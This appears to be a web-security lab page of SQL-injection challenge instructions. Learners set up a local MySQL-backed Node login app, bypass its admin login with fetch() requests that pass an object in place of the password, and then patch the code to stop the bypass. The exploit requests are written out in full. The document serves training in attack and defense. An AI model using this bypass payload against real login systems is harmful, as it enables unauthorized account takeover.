<!DOCTYPE html>
<html lang="en">
<!--Common Headers-->
<?php
    require_once 'common_header.php';
?>

<?php
    require_once 'common_session_no.php';
?>
<?php
$statusFile = '/var/www/html/status_sqli.txt';
$status = trim(file_get_contents($statusFile));
$iframeSource = $status == 'active' ? "https://websechomeserver.ddns.net:3203" : "https://websechomeserver.ddns.net:3201";
?>

<head>
    <title>SQLi Challenge Instructions</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
        }
        .container {
            display: flex;
            height: 100%;
        }
        .instructions {
            flex: 1;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow-y: auto;
        }
        .iframe-container {
            flex: 3;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        iframe {
            width: 100%;
            height: calc(100% - 40px);
            border: none;
        }
        h2 {
            color: #333;
        }
        ol {
            line-height: 1.6;
        }
        li {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="instructions">
        <h2>SQLi Challenge Instructions</h2>
        <ol>

<li>Go into root</li>
            <li>Run: <code>apt-get update</code></li>
            <li>Install MySQL server: <code>apt install mysql-server</code></li>
	    <li>Start the mysql service: <code>service mysql start</code></li>
            <li>Access MySQL as root: <code>sudo mysql -u root</code>
                <br>Execute the following commands in MySQL:
                <ul>
                    <li>CREATE DATABASE IF NOT EXISTS `login` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</li>
                    <li>USE `login`;</li>
                    <li>CREATE TABLE IF NOT EXISTS `accounts` (
                          `id` int(11) NOT NULL, 
                          `username` varchar(50) NOT NULL, 
                          `password` varchar(255) NOT NULL, 
                          `email` varchar(100) NOT NULL
                        ) ENGINE = InnoDB AUTO_INCREMENT = 2 DEFAULT CHARSET = utf8;</li>
                    <li>INSERT INTO `accounts` (`id`, `username`, `password`, `email`) VALUES (1, 'admin', SHA2(CONCAT(RAND(), UUID(), RAND()), 512), 'admin@flatt.tech');</li>
                    <li>ALTER TABLE `accounts` ADD PRIMARY KEY (`id`);</li>
                    <li>ALTER TABLE `accounts` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT = 2;</li>
                </ul>
                <br>Exit MySQL: <code>exit</code>
            </li>
            <li>Start the mysql service and the nodeJs app:
                <br><code>sudo service mysql start</code>
                <br><code>node /config/Desktop/SQLI-1/login.js</code>
            </li>
            <li>Open the web browser and navigate to <code>http://localhost:8080</code></li>
            <li>Using Developer Tools, capture the HTTP request and response using the Network tab. By entering a random username and password on the website, the auth endpoint will be shown on the Developer Tools.</li>
            <li>You can copy the authentication request as fetch() code to execute it as JavaScript code in the Console tab.</li>
            <li>Removing the verbose information from the code, we get:
                <pre>fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=admin&password=12341234test",
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));</pre>
            </li>
            <li>Edit the code as shown below to perform the exploit:
                <pre>fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: "username=admin&password[password]=1",
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));

OR

data = {
  username: "admin",
  password: {
    password: 1,
  },
};
fetch("http://127.0.0.1:8080/auth", {
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify(data),
  method: "POST",
  mode: "cors",
  credentials: "include",
})
.then((r) => r.text())
.then((r) => console.log(r));</pre>
            </li>
            <li>You can then navigate to the home directory and see that you're logged in as admin.</li>
            <li>You can now modify the source codes in the SQLI-1 folder to try and prevent the SQLI attack.</li>
            <li>After modifying, start up the nodeJs app again and test using the same input as before.</li>
            <li>If the webpage does not allow the login bypass, you have completed this challenge.</li>
            <li>Repeat if unsuccessful in defending.</li>
        </ol>
    </div>
    <div class="iframe-container">
        <iframe src="<?php echo htmlspecialchars($iframeSource); ?>" width="100%" height="600" frameborder="0"></iframe>
    </div>
</div>

</body>
</html>
